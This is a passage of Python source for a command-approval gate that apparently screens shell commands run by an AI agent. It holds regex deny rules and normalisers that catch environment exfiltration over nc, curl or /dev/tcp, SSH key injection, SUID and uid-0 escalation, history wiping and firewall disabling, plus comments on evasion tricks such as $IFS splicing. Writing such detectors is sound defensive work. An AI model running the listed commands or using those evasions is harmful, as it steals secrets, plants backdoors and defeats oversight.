    # Same loosening class as `iptables -P INPUT ACCEPT` (already gated by the
    # iptables rule) in nftables spelling. An unconditional `accept` in the input chain bypasses
    # every preceding rule for all matched traffic. `nft add rule … drop|reject` stays covered
    # conceptually by rule-tightening harm, but is NOT gated here — only the ACCEPT direction of
    # an explicitly-added rule is the loosening; `nft list ruleset` (read-only) stays clean.
    (r'\bnft\b' + _SEGMENT_BOUND + r'\badd\s+(?:rule|table)\b' + _SEGMENT_BOUND + r'\baccept\b',
     "accept-all nftables rule (nft add rule ... accept)"),
    # `fail2ban-client stop` turns off brute-force protection for every jail; `set … unban` (X109)
    # only clears one already-banned address and stays clean.
    (r'\bfail2ban-client\b' + _SEGMENT_BOUND + r'\bstop\b',
     "stop fail2ban (disables brute-force protection)"),  # X110
    # chmod that OPENS a credential/env file to group or other: the mode's last two octal digits are
    # both >= 4 (644/755/664 …), and the target must name an env/credential file. Tightening
    # (600: X200, 700: X325), a non-sensitive target (README.md: X198, blog/: X204) and a symbolic
    # mode (g+w: X205) all stay clean. Placed BEFORE the world-writable rules' own class so
    # `chmod 777/666` keeps "world/other-writable permissions".
    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[0-7]?[0-7])?[4-7][4-7]\s+(?:-[^\s]+\s+)*\S*'
     r'(?:\.env(?:\.[\w.-]+)*|credentials?|\.netrc|\.pgpass|\.npmrc|\.pypirc|id_rsa|id_ed25519|\.pem|\.key)\b',
     "grant group/other read access to env/credential file"),  # X207 X220
    # SUID/SGID bit: a setuid binary runs as its owner regardless of who invokes it — the classic
    # local privilege-escalation primitive. Octal 4xxx/2xxx/6xxx or the symbolic `+s`.
    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[ugoa]*\+s\b|[246][0-7]{3}\b)',
     "set SUID bit on executable"),  # X190 X195
    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s0{3,4}\b',
     "remove all permissions (chmod 000)"),  # X196
    # Recursive chown of /root (or its .ssh) hands the whole home — private keys, .env, config — to
    # another user. A subtree (`/root/builds`: X201, `/root/blog`: X208) is NOT the home
    # itself and stays clean, so the target needs an explicit end-of-token boundary. `/root/.ssh` is
    # folded to `~/.ssh` by _fold_resolved_ssh_dir before matching (HOME=/root), so both spellings
    # are listed — the general home fold never fires for a single-component home, which is why a
    # bare `/root` still arrives unfolded.
    (r'\bchown\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*R[a-z]*\b|--recursive\b)' + _SEGMENT_BOUND
     + r'\s(?:/root(?:/\.ssh)?(?:/\*)?|~/\.ssh(?:/\*)?|~)(?=[\s;|&]|$)',
     "recursive chown of /root or /root/.ssh"),  # X189 X315
    # usermod: adding a user to a privileged group (sudo/wheel/adm/docker — docker group is
    # root-equivalent via the daemon socket) or locking an account.
    (r'\busermod\b' + _SEGMENT_BOUND + r'\s-a[a-z]*G?[a-z]*\b' + _SEGMENT_BOUND + r'\b(?:sudo|wheel|adm|docker)\b',
     "grant privileged group membership (usermod -aG sudo)"),  # X191
    (r'\busermod\b' + _SEGMENT_BOUND + r'\s(?:-L\b|--lock\b)',
     "lock user account (usermod -L)"),  # X301
    # `passwd -d` removes the password hash entirely, so the account authenticates with an empty
    # password — a silent remote-login door.
    (r'\bpasswd\b' + _SEGMENT_BOUND + r'\s(?:-d\b|--delete\b)',
     "delete user password (passwd -d)"),  # X192
    (r'\bsetfacl\b' + _SEGMENT_BOUND + r'\s(?:-R\b|--recursive\b)',
     "recursive ACL modification (setfacl -R)"),  # X193
    # `credential.helper store` writes every git credential in plaintext to ~/.git-credentials,
    # where any reader of the home directory (or a backup) picks up the tokens.
    (r'\bgit\s+config\b' + _SEGMENT_BOUND + r'\bcredential\.helper\b' + _SEGMENT_BOUND + r'\bstore\b',
     "store git credentials in plaintext (credential.helper store)"),  # X218
    # Dumping the process environment to a file exposes every exported secret (API keys, DB URLs).
    # Only a REDIRECT is gated: `printenv | tee .env backup` is already covered by the project
    # env/config tee rule and must keep that reason (TestProjectSensitiveTeePattern).
    (r'\bprintenv\b' + _SEGMENT_BOUND + r'\s>>?\s*\S',
     "dump environment variables to file"),  # X219
    # Residual: the same dump PUSHED OUTWARD instead of to a file — piped into a
    # network client (`printenv | curl -X POST -d @- …`, `env | nc 1.2.3.4 4444`, `env -0 |
    # socat …`) or redirected into the bash /dev/tcp pseudo-device. _CMDPOS anchors the dump
    # word to a command position, so the exfil shape inside quoted prose or a grep pattern is
    # data, not a command. `env FOO=1 curl …` stays clean two ways: `env` as a WRAPPER has no
    # pipe/redirect sink after it, and where the wrapper IS consumed by _CMDPOS the remaining
    # `curl …` is not the dump word. `env | grep PATH` pipes to a local tool — no sink matches.
    (_CMDPOS + r'(?:printenv|env)\b' + r'[^;|&\n]*'
     + r'(?:\|\s*(?:sudo\s+)?(?:env\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp)\b'
     + r'|>>?\s*/dev/(?:tcp|udp)/)',
     "exfiltrate environment variables over network (printenv/env pipe to network tool)"),
    # uid-0 account: a second root by uid, invisible to `whoami`-based guards.
    (r'\buseradd\b' + _SEGMENT_BOUND + r'\s(?:-u\s+0\b|--uid[=\s]+0\b)',
     "create root-equivalent user (uid 0)"),  # X288
    # `docker run --privileged` disables all container isolation (device + capability access), so a
    # `-v /:/host` mount escapes straight to the host filesystem.
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*run\b' + _SEGMENT_BOUND + r'\s--privileged\b',
     "docker run --privileged (container escapes to host)"),  # X313
    # ── harm-layer "history" backlog (corpus, harm_layer=history) ──────
    # False negatives whose harm is HISTORY/RECOVERY loss: uncommitted work discarded, a stash
    # destroyed, the commit graph rewritten, the reflog recovery path expired, secrets pushed into
    # commit history, or the shell history (the host's own audit trail) wiped.
    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
    # segment cannot contaminate the verdict, is _CMDPOS-anchored where the token could otherwise
    # be quoted PROSE (`git commit -m "… git add .env …"` is data, not a command), and every rule
    # was FP-measured against the corpus label-0 rows before landing (FP stays exactly the known
    # 25 ids, no new id).
    #
    # `git checkout -- <path>` discards the uncommitted changes to <path>; the pre-image lives only
    # in the index/HEAD, so there is no on-disk copy to recover. The `--` separator is what makes
    # the operands PATHSPECS — a branch SWITCH (`git checkout main`, X051) carries no `--` and stays
    # clean, as does `git checkout --orphan gh-pages` (the token after `--` is not a separator).
    # The bare `git checkout .` spelling is the SAME discard-all without the separator and is
    # accepted by the identical alternative; `git checkout ./file` is a PATH and does not match.
    # `git restore --staged .` (X057) only unstages and is likewise clean.
    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+checkout\b' + _SEGMENT_BOUND + r'\s(?:--|\.)(?:\s|$)',
     "git checkout -- (discards uncommitted changes)"),  # X033
    # A stash is a one-copy safety net: `drop` deletes one entry, `clear` deletes every entry.
    # `git stash push -m …` (X050) and `git stash pop` (X054) keep the entry and stay clean.
    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+stash\b' + _SEGMENT_BOUND + r'\s(?:drop|clear)\b',
     "git stash drop/clear (destroys stashed changes)"),  # X038 X303
    # `filter-repo`/`filter-branch` rewrite every commit hash in the repository: the original objects
    # become unreachable and every clone/PR based on them is invalidated. Read-only spellings stay
    # clean per the chain-wide rule ("no new rule may gate a lookup"): `--help`/`-h` print the man
    # page, `--version` prints the banner, and `--dry-run` only REPORTS what would be rewritten
    # (filter-repo never touches the object store under it). The lookahead is anchored to the token
    # directly after the command word, so a flag further along the line does not buy an exemption,
    # and a real rewrite (`--force`, `--tree-filter`, `--path`) is still gated.
    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+(?:filter-repo|filter-branch)\b'
     + r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b))',
     "git history rewrite (filter-repo/filter-branch)"),  # X035
    # `reflog expire` drops the reflog entries that make a bad reset/rebase recoverable — the usual
    # first half of "wipe the local evidence" (`&& git gc --prune=now` finishes the job).
    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+reflog\b' + _SEGMENT_BOUND + r'\s+expire\b',
     "git reflog expire (destroys recovery path)"),  # X302
    # Committing an env file publishes every secret it holds into the repository history, where a
    # later `git rm` cannot take it back (the blob stays in the pack and in every clone). Only the
    # env-file family is gated. EXACT template suffixes — `.env.example`, `.env.sample`,
    # `.env.template` (and prefixed variants like `.env.local.example`) — are exempted per the
    # Review verdict: the industry standard is to commit templates (they hold no real
    # values, only placeholders). Anything else in the family keeps the gate when in doubt
    # (`.env`, `.env.local`, `.env.production`, `.env.*.local`, `.env.examples`).
    # `--dry-run`/`-n` only REPORTS what would be staged — a lookup under the chain-wide criterion, so
    # the flag anywhere BEFORE the env path suppresses the gate (tempered group: the scan from
    # `add` to the path cannot cross a dry-run token). A path that precedes the flag
    # (`git add .env --dry-run`) still gates — flag-last spellings are rare and gating the
    # doubtful case is the safe direction. `git add -A` (X045) carries no env path either way.
    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+add\b'
     + r'(?:(?!--dry-run\b)(?!-n(?=[\s;|&)]))[^;|&\n])*'
     + r'\s\S*'
     + r'(?:(?:/|\.{1,2}/)?(?:[^\s/"\'`]+/)*\.env'
     + r'(?!\.(?:[\w-]+\.)*(?:example|sample|template)\b)'
     + r'(?:\.[^/\s"\'`]+)*)',
     "git add of env file (secrets into commit history)"),  # X229
    # `history -c` wipes the shell's command log — the only local record of what ran on the host,
    # which is what an intruder clears first. _CMDPOS-anchored so `history` must be the command word
    # (`grep history -c README`, `git log --oneline history -c` are data).
    (_CMDPOS + r'history\b' + r'\s+-c\b', "clear shell history (history -c)"),  # X291
]


DANGEROUS_PATTERNS_COMPILED = [(re.compile(p, _RE_FLAGS), d) for p, d in DANGEROUS_PATTERNS]
# Dynamic-word rules look for glob/brace characters, which are ordinary data inside quotes
# (`find . -name 'log-del*'`), so they scan the quote-masked variant like the positionless hardline rules.
_QUOTE_MASKED_DANGEROUS_DESCRIPTIONS = frozenset({
    "find dynamic shell word may expand to destructive flag",
    "dynamic shell word may expand to arbitrary program execution flag",
})
# Rules anchored on a COMMAND WORD must not fire on quoted prose. `echo 'ufw disable'`,
# `grep -n 'iptables -F' notes.md` and `hermes ... --body "docker system prune -a --volumes"` pass
# that text to a command as an ARGUMENT; the shell never runs it, so requiring approval for it is a
# false positive that trains the operator to approve without reading. Same rationale as the
# _CMDPOS-anchored rules above (mkfs/dd/shutdown) and the quote-masked hardline rules. Matching
# runs against _mask_quoted_prose, which keeps quoted text the shell really executes RAW: `$(...)`
# and backticks inside double quotes, plus the payload variants `_command_detection_variants()`
# surfaces for shell carriers (`sh -c 'ufw disable'`) and interpreter flags (`python3 -c ...`).
#
# Deliberately NOT applied to the SQL-statement rules (`DROP SCHEMA`, `ALTER TABLE ... DROP
# COLUMN`, `UPDATE ... SET ... = NULL`, `DELETE FROM`): there the quoted string IS the statement a
# database client executes (`psql -c 'DELETE FROM leads WHERE id = 42'`), so it is code, not prose —
# masking it would drop a real positive. Those rules keep matching quoted text, exactly as the
# pre-existing `DROP TABLE|DATABASE` rule already does on main.
_QUOTE_MASKED_COMMAND_DESCRIPTIONS = frozenset({
    "kill PID 1 (init)",
    "bring network interface down",
    "systemctl isolate/rescue (drops all running services)",
    "disable swap (swapoff)",
    "write to sysrq-trigger (kernel emergency command)",
    "symlink over /etc file (ln -sf)",
    "write to authorized_keys (SSH key injection)",
    "kill processes by name (killall)",
    "kill processes on file/socket (fuser -k)",
    "git mirror push (deletes/overwrites remote refs not present locally)",
    "git push prune (deletes remote refs absent locally)",
    "git push delete (removes a remote branch/ref)",
    "git push force via +refspec prefix (rewrites remote history)",
    "git push with lease (safe force variant, still overwrites when lease holds)",
    "shred --remove (irreversible file destruction)",
    "wipe filesystem signatures (wipefs)",
    "truncate file to zero (data destruction)",
    "redis data destruction (FLUSHALL/FLUSHDB/DEL)",
    "pg_restore --clean (drops existing database objects)",
    "drop PostgreSQL cluster (pg_dropcluster)",
    "docker volume rm/prune (destroys volume data)",
    "docker system prune --all/--volumes (destroys images and volumes)",
    "docker rm --force (forced container removal)",
    "docker pause (suspends container)",
    "apt remove/purge of security or infrastructure package",
    "rsync --delete over live data tree (deletes files missing at source)",
    "remove crontab (crontab -r)",
    "empty redirect truncates backup dump file",
    "redirect overwrites latest backup file",
    "ssh-keygen overwrites default SSH identity key",
    "delete Vault secret (vault kv delete)",
    "disable firewall (ufw disable/reset)",
    "open database/app service port (ufw allow)",
    "relax firewall default policy (ufw default allow)",
    "open firewall to any source (ufw allow from any)",
    "deny SSH access (ufw deny 22)",
    "modify firewall rules (iptables)",
    "flush nftables ruleset",
    "accept-all nftables rule (nft add rule ... accept)",
    "stop fail2ban (disables brute-force protection)",
    "grant group/other read access to env/credential file",
    "set SUID bit on executable",
    "remove all permissions (chmod 000)",
    "recursive chown of /root or /root/.ssh",
    "grant privileged group membership (usermod -aG sudo)",
    "lock user account (usermod -L)",
    "delete user password (passwd -d)",
    "recursive ACL modification (setfacl -R)",
    "store git credentials in plaintext (credential.helper store)",
    "dump environment variables to file",
    "exfiltrate environment variables over network (printenv/env pipe to network tool)",
    "create root-equivalent user (uid 0)",
    "docker run --privileged (container escapes to host)",
    "git checkout -- (discards uncommitted changes)",
    "git stash drop/clear (destroys stashed changes)",
    "git history rewrite (filter-repo/filter-branch)",
    "git reflog expire (destroys recovery path)",
    "git add of env file (secrets into commit history)",
    "clear shell history (history -c)",
})
_QUOTE_MASKED_DANGEROUS_DESCRIPTIONS |= _QUOTE_MASKED_COMMAND_DESCRIPTIONS

# Preserve approvals stored under the removed interpreter regex rules.
_REMOVED_PATTERN_KEY_ALIASES = {
    "script execution via -e/-c flag": "(python[23]?|perl|ruby|node)\\s+-[ec]\\s+",
    "script execution via heredoc": "(python[23]?|perl|ruby|node)\\s+<<",
}
# description <-> legacy regex-derived key (the old approval key, kept for backwards compatibility
# with stored allowlist/session entries), both ways.
_PATTERN_KEY_ALIASES: dict[str, set[str]] = {}
for _canonical_key, _legacy_key in [
    (d, p.split(r'\b')[1] if r'\b' in p else p[:20]) for p, d in DANGEROUS_PATTERNS
] + list(_REMOVED_PATTERN_KEY_ALIASES.items()):
    _PATTERN_KEY_ALIASES.setdefault(_canonical_key, set()).update({_canonical_key, _legacy_key})
    _PATTERN_KEY_ALIASES.setdefault(_legacy_key, set()).update({_legacy_key, _canonical_key})


def _approval_key_aliases(pattern_key: str) -> set[str]:
    """All approval keys for this pattern: the description plus the historical regex-derived key
    older allowlist/session entries may still use."""
    return _PATTERN_KEY_ALIASES.get(pattern_key, {pattern_key})


# ---- Detection ----------------------------------------------------------------------------
def _fold_resolved_ssh_dir(command: str) -> str:
    """Fold ``<resolved home>/.ssh/`` to ``~/.ssh/`` (detection-time).

    ``_home_prefix_fold_regex`` deliberately refuses a single-component home (a stray ``HOME``
    must not rewrite unrelated prefixes), which left every ``~/.ssh`` rule DISARMED on a root-only
    host where ``HOME=/root``: ``cat k >> /root/.ssh/authorized_keys`` (SSH key implant) and
    ``cp evil /root/.ssh/authorized_keys`` auto-approved while the identical ``~`` spelling was
    gated. The SSH directory is the one path whose absolute spelling is always the same security
    surface (``authorized_keys``, private keys), so it is folded on its own — deliberately NARROWER
    than relaxing the general home fold, which would also start gating ``>> /root/.bashrc`` (corpus
    X297 is label 0, so the general fold would add a false positive).
    """
    try:
        home = os.path.expanduser("~")
        paths = [home, os.path.realpath(home)]
    except Exception:
        return command
    for prefix in paths:
        if not prefix or prefix in ("/", "~"):
            continue
        command = re.sub(
            re.escape(prefix.rstrip("/")) + r"(?=[/\\]\.ssh(?:[/\\]|$))",
            "~", command, flags=re.IGNORECASE,
        )
    return command


def _normalize_command_for_detection(command: str) -> str:
    """Normalize a command before pattern matching so ANSI escapes, null bytes, Unicode fullwidth
    forms, and shell splicing tricks cannot bypass detection."""
    from tools.ansi_strip import strip_ansi
    command = unicodedata.normalize('NFKC', strip_ansi(command).replace('\x00', ''))
    # Collapse backslash-newline continuations (`rm -rf \<newline>/` runs as `rm -rf /`). MUST
    # precede the generic escape strip below, whose [^\n] class skips newlines and would leave the
    # backslash wedged between tokens, defeating the structured rm/mkfs/dd patterns incl. the HARDLINE floor.
    command = re.sub(r'\\\r?\n', '', command)
    # Fold absolute user/Hermes home prefixes to ~/ and ~/.hermes/ so the static patterns catch /home/alice/.bashrc
    # and C:\Users\alice\.bashrc. Resolved at detection time (not import time) so it tracks HOME/HERMES_HOME set
    # later. MUST run before the backslash strip (which would dissolve C:\Users\alice to C:Usersalice). Hermes home
    # first: on Windows it nests under the user home, and folding the user home first would eat the prefix it needs.
    command = _rewrite_resolved_hermes_home(command)
    command = _rewrite_resolved_user_home(command)
    command = _fold_resolved_ssh_dir(command)
    # Strip backslash-escapes (r\m -> rm) and empty-string literals (r''m -> rm).
    command = re.sub(r'\\([^\n])', r'\1', command)
    command = re.sub(r"''|\"\"", '', command)
    # Collapse $IFS / ${IFS...} (incl. `${IFS:0:1}`) to a space: IFS defaults to whitespace, so `rm${IFS}-rf${IFS}/`
    # runs as `rm -rf /`, and every pattern — incl. the hardline floor — anchors on literal \s between tokens.
    return re.sub(r'\$\{IFS\b[^}]*\}|\$IFS\b', ' ', command)


# Shell metacharacters, quotes, and whitespace that terminate a path token.
_PATH_TOKEN_STOP = r"""\s'"`;|&<>()"""
_PATH_TAIL = r"(?P<tail>(?:[/\\][^/\\" + _PATH_TOKEN_STOP + r"]*)+)"


@functools.lru_cache(maxsize=64)
def _home_prefix_fold_regex(path: str):
    """Compile a regex matching *path* as an absolute directory prefix.
    Components match with either separator so native Windows, forward-slash, and mixed forms all
    fold; the caller normalizes the tail's backslashes to ``/``. A non-empty tail is required, so a
    bare home is never folded. Returns ``None`` for an unset/degenerate path (fewer than two
    components: ``/``, ``C:\\``, ``""``) so a stray HOME cannot rewrite unrelated prefixes."""
    components = [c for c in re.split(r"[/\\]+", path) if c] if path else []
    if len(components) < 2:
        return None
    # Optional leading root separator; a Windows drive letter is a component.
    return re.compile(r"[/\\]*" + r"[/\\]+".join(re.escape(c) for c in components) + _PATH_TAIL)


def _fold_home_prefixes(command: str, paths, replacement: str) -> str:
    """Fold each resolved home prefix in *command* to *replacement* (no trailing separator; the tail
    supplies it). Longest first so a deeper home folds before a shorter overlapping one that would clobber it."""
    for path in dict.fromkeys(sorted((p for p in paths if p), key=len, reverse=True)):
        pattern = _home_prefix_fold_regex(path)
        if pattern is not None:
            command = pattern.sub(lambda m: replacement + m.group("tail").replace("\\", "/"), command)
    return command


def _rewrite_resolved_user_home(command: str) -> str:
    """User home (expanduser / realpath / $HOME) -> ``~/``; no-op when unset, degenerate, or unresolvable."""
    try:
        # expanduser, realpath, and an explicit HOME — Windows expanduser uses USERPROFILE, not HOME.
        home = os.path.expanduser("~")
        paths = [home, os.path.realpath(home), os.environ.get("HOME", "")]
    except Exception:
        return command
    return _fold_home_prefixes(command, paths, "~")


def _rewrite_resolved_hermes_home(command: str) -> str:
    """Resolved HERMES_HOME (and its realpath) -> ``~/.hermes/`` so the _HERMES_CONFIG_PATH /
    _HERMES_ENV_PATH rules match Docker/gateway deployments that spell the absolute path."""
    try:
        from hermes_constants import get_hermes_home
        home = get_hermes_home().expanduser()
        paths = [str(home), str(home.resolve(strict=False))]
    except Exception:
        return command
    return _fold_home_prefixes(command, paths, "~/.hermes")


_PARAM_REPLACEMENT_RE = re.compile(r"\$\{[^}/\s]+/[^}/]*/(?P<replacement>[^}]*)\}")
_PARAM_DEFAULT_RE = re.compile(r"\$\{[^}:}\s]+:-(?P<default>[^}]*)\}")
_SIMPLE_SHELL_LITERAL_RE = re.compile(r"^[A-Za-z0-9_./:@%+=,-]+$")
_ENV_ASSIGNMENT_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*")
_COMMAND_WRAPPER_WORDS = {"sudo", "env", "exec", "nohup", "setsid", "time", "command", "builtin",
                          "nice", "timeout", "stdbuf", "ionice", "chrt", "taskset", "chroot"}
_SUDO_OPTIONS_WITH_ARG = {"-c", "--close-from", "-g", "--group", "-h", "--host", "-p", "--prompt", "-u", "--user"}
# Adapted from embwl0x's command-position work in #76063. Option operands are
# data, not executable positions; option spelling remains case-sensitive.
_COMMAND_WRAPPER_OPTIONS_WITH_ARG = {
    "chroot": {"--groups", "--userspec"},
    "sudo": _SUDO_OPTIONS_WITH_ARG,
    "env": {"-a", "--argv0", "-C", "--chdir", "-S", "--split-string", "-u", "--unset"},
    "exec": {"-a"}, "nice": {"-n", "--adjustment"},
    "time": {"-f", "--format", "-o", "--output"},
    "timeout": {"-k", "--kill-after", "-s", "--signal"},
    "stdbuf": {"-e", "--error", "-i", "--input", "-o", "--output"},
    "ionice": {"-c", "--class", "-n", "--classdata"},
}
_COMMAND_WRAPPER_NON_EXECUTING_OPTIONS = {
    "command": {"-v", "-V"}, "chrt": {"-p", "--pid"},
    "ionice": {"-p", "--pid", "--pgid", "--uid"}, "taskset": {"-p", "--pid"},
}
_COMMAND_WRAPPER_POSITIONAL_ARGS = {"chroot": 1, "chrt": 1, "taskset": 1, "timeout": 1}
_SHELL_COMMAND_TRANSITIONS = {"if", "then", "else", "elif", "do", "while", "until", "!"}
_SHELL_REDIRECTION_RE = re.compile(r"(?:[0-9]+)?(?:>>|<<|<>|>&|<&|>\||[<>])")

_INTERPRETER_NAME_RES = tuple((family, re.compile(pattern)) for family, pattern in (
    ("python", r"py(?:\.exe)?|python[23]?(?:\.\d+)*(?:\.exe)?"), ("node", r"node(?:js)?(?:\.exe)?"),
    ("perl", r"perl[0-9]*(?:\.\d+)*(?:\.exe)?"), ("ruby", r"ruby[0-9.]*(?:\.exe)?"), ("php", r"php(?:\.exe)?"),
    ("powershell", r"powershell(?:\.exe)?|pwsh(?:\.exe)?"),
    ("bun", r"bun(?:\.exe)?"), ("deno", r"deno(?:\.exe)?"),
))
_INTERPRETER_EXEC_FLAGS = {
    "python": {"-c"}, "node": {"-e", "--eval", "-p", "--print"}, "perl": {"-e", "--eval"}, "ruby": {"-e"},
    "php": {"-r"}, "powershell": {"-command", "-c", "-file", "-f"},
    "bun": {"-e", "--eval"}, "deno": {"eval", "-e", "--eval"},
}
_INTERPRETER_WITH_ARG = {
    "python": {"-W", "-X", "--check-hash-based-pycs"},
    "node": {"-C", "--conditions", "--cpu-prof-dir", "--diagnostic-dir", "--icu-data-dir", "--import", "--loader",
             "--openssl-config", "--require", "--title"},
    "perl": {"-0", "-F", "-I", "-M", "-m", "-x"}, "ruby": {"-C", "-E", "-F", "-I", "-K", "-r"},
    "php": {"-c", "-d", "-z"},
    "powershell": {"-configurationname", "-custompipename", "-executionpolicy", "-inputformat", "-outputformat",
                   "-settingsfile", "-version", "-windowstyle", "-workingdirectory"},
    # Deno deliberately maps to no value-taking globals: its inline-script entry is the
    # bare `eval` subcommand (first-arg fast path below), and its dash flags that precede
    # `eval` (--ext, --no-check, ...) never swallow the next token as a value.
    "bun": {"--config", "--cwd", "--env-file", "--preload", "--require"}, "deno": set(),
}
_READ_TOOL_EXEC_FLAGS = {
    "sort": {"--compress-program"}, "rg": {"--pre", "--hostname-bin"}, "ag": {"--pager"},
    "man": {"--pager", "--html", "-P", "-H"},
}
# Required-argument options are ownership boundaries: an option-looking next token is data, not another option. These
# sets mirror the invocation grammar of the supported binaries (ripgrep 14, GNU sort, man-db, and ag 2.2).
_READ_TOOL_LONG_OPTIONS_WITH_ARG = {
    "rg": {
        "--after-context", "--before-context", "--color", "--colors", "--context", "--context-separator",
        "--dfa-size-limit", "--encoding", "--engine", "--field-context-separator", "--field-match-separator",
        "--file", "--generate", "--glob", "--hostname-bin", "--hyperlink-format", "--iglob", "--ignore-file",
        "--max-columns", "--max-count", "--max-depth", "--max-filesize", "--path-separator", "--pre", "--pre-glob",
        "--regex-size-limit", "--regexp", "--replace", "--sort", "--sortr", "--threads", "--type", "--type-add",
        "--type-clear", "--type-not",
    },
    "sort": {
        "--batch-size", "--buffer-size", "--compress-program", "--field-separator", "--files0-from", "--key",
        "--output", "--parallel", "--random-source", "--sort", "--temporary-directory",
    },
    "man": {
        "--config-file", "--encoding", "--extension", "--locale", "--manpath", "--pager", "--preprocessor",
        "--prompt", "--recode", "--sections", "--systems",
    },
    "ag": {
        "--ackmate-dir-filter", "--color-line-number", "--color-match", "--color-path", "--depth",
        "--filename-pattern", "--file-search-regex", "--ignore", "--ignore-dir", "--max-count", "--pager",
        "--path-to-ignore", "--width", "--workers",
    },
}
_READ_TOOL_SHORT_OPTIONS_WITH_ARG = {
    "rg": frozenset("efEmjgdtTABCMr"), "sort": frozenset("koStT"), "man": frozenset("CRLmMSserEPp"),
    "ag": frozenset("gGmpW"),
}
_GREP_OPTIONS_WITH_ARG = {
    "--after-context", "--before-context", "--binary-files", "--context", "--directories", "--devices", "--exclude",
    "--exclude-dir", "--exclude-from", "--include", "--label", "--max-count", "--regexp", "--file",
}
_GREP_SHORT_OPTIONS_WITH_ARG = {"A", "B", "C", "D", "d", "e", "f", "m"}
_BASH_OPTIONS_WITH_ARG = {"-O", "+O", "-o", "+o", "--init-file", "--rcfile"}
_BASH_SHORT_OPTION_LETTERS = frozenset("ilrsDcabefhkmnptuvxBCEHPTOo")
_MAX_DETECTION_COMMAND_CHARS, _MAX_SEPARATOR_FREE_COMMAND_CHARS, _MAX_DETECTION_SEGMENTS = 128_000, 4_096, 25_000
_PARSER_LIMIT_DESCRIPTION = "command parser limit exceeded"
_MALFORMED_EXEC_DESCRIPTION = "command parser limit or malformed executable payload"
_GATEWAY_LIFECYCLE_SPLICE_DESCRIPTION = "stop/restart hermes gateway via shell-spliced verb (kills running agents)"


def _command_parser_limit_exceeded(command: str) -> bool:
    """Bound all parser work before normalization/tokenization. Separator counting is deliberately
    conservative: quoted separators over-count, but crossing the ceiling fails closed rather than
    letting an uninspected suffix execute."""
    if len(command) > _MAX_DETECTION_COMMAND_CHARS:
        return True
    # Long separator-free input has no compound-command utility and makes every regex inspect one giant token.
    if len(command) > _MAX_SEPARATOR_FREE_COMMAND_CHARS and not any(char in command for char in ";&|\n"):
        return True
    return sum(command.count(char) for char in ";&|\n") >= _MAX_DETECTION_SEGMENTS


def _backtick_end_from(segment: str, i: int) -> int | None:
    """Index of the backtick closing the one opened at ``i``, or None when none follows."""
    j = segment.find("`", i + 1)
    while j != -1 and segment[j - 1] == "\\":
        j = segment.find("`", j + 1)
    return None if j == -1 else j


def _shell_tokens_with_spans(segment: str, start: int):
    """Return shell words as ``(value, start, end, quoted)`` or ``None`` on malformed quoting.
    Deliberately small lexer that never expands shell syntax; it exists to keep source spans (which
    ``shlex`` does not expose) for deciding which quoted grep operand is data, not another command.

    Lexing stops at the end of the simple command that begins at *start*: an unquoted ``;``, ``|``,
    ``&`` or newline, or the ``)`` / backtick that closes the substitution the command sits inside.
    Without that, a grep nested as ``"$(grep … | cut …)"`` was lexed together with the enclosing
    command's closing quote, read as unbalanced quoting, and reported as a hardline block (546
    blocked turns in one run, every one a false positive; ``sed -n "$(grep -n X f | cut -d: -f1),+3p" f``
    is the canonical shape)."""
    tokens, value, token_start, quote = [], [], None, None
    depth = 0  # $(...) nesting opened AFTER start; a closer at depth 0 ends the enclosing substitution
    # A backtick opened AFTER start is an operand substitution (``grep -e `cmd` f``); the matching
    # closer belongs to it, not to an enclosing backtick the command might sit inside.
    in_backtick = False

    def flush(end: int) -> None:
        raw = segment[token_start:end]
        # Only a wholly single-quoted operand is inert shell data. Double quotes still execute $()
        # and backticks; unquoted substitutions do too.
        inert = (raw.startswith("'") and raw.endswith("'")) or ("='" in raw and raw.endswith("'"))
        tokens.append(("".join(value), token_start, end, inert))

    end_at = len(segment)
    for kind, i, _, _ in _scan_shell(segment, start):
        ch = segment[i]
        if kind == "char" and not quote:
            if ch.isspace() and ch != "\n":
                if token_start is not None:
                    flush(i)
                    value, token_start = [], None
                continue
            if segment.startswith("$(", i):
                depth += 1
            elif ch == "`":
                if in_backtick:
                    in_backtick = False
                elif depth == 0 and _backtick_end_from(segment, i) is None:
                    end_at = i  # unmatched: it closes the substitution this command sits inside
                    break
                else:
                    in_backtick = True
            elif ch == ")":
                if depth == 0:
                    end_at = i
                    break
                depth -= 1
            elif ch in ";|&\n":
                end_at = i
                break
        if token_start is None:
            token_start = i
        if kind == "quote":
            quote = None if quote else ch
        elif kind == "esc":
            value.append(segment[i + 1])
        elif ch == "\\" and not quote:
            return None  # dangling backslash
        else:
            value.append(ch)
    if quote:
        return None
    if token_start is not None:
        flush(end_at)
    return tokens


def _quoted_grep_pattern_spans(command: str) -> tuple[list[tuple[int, int]], bool]:
    """Structurally locate quoted grep PCRE operands -> (spans, malformed). On an ambiguous or
    malformed grep parse callers fail closed and use the original command: no text is hidden on
    an uncertain parse."""
    spans: list[tuple[int, int]] = []
    offset = 0
    for segment in _iter_top_level_shell_segments(command):
        segment_at = command.find(segment, offset)
        offset = segment_at + len(segment)
        for start, _, word in _iter_shell_command_word_spans(segment):
            if os.path.basename(_deobfuscate_shell_word_for_detection(word)).lower() not in {"grep", "egrep"}:
                continue
            tokens = _shell_tokens_with_spans(segment, start)
            if tokens is None:
                return [], True
            args, pattern_indexes = tokens[1:], []
            pcre = explicit_patterns = False
            operand_index, i, options = None, 0, True
            while i < len(args):
                token = args[i][0]
                if options and token == "--":
                    options = False
                elif options and token.startswith("--"):
                    option, equals, _ = token.partition("=")
                    pcre = pcre or option == "--perl-regexp"
                    explicit_patterns = explicit_patterns or option in {"--regexp", "--file"}
                    takes_next = option in _GREP_OPTIONS_WITH_ARG and not equals
                    if takes_next and i + 1 >= len(args):
                        return [], True
                    if option == "--regexp":
                        pattern_indexes.append(i + 1 if takes_next else i)
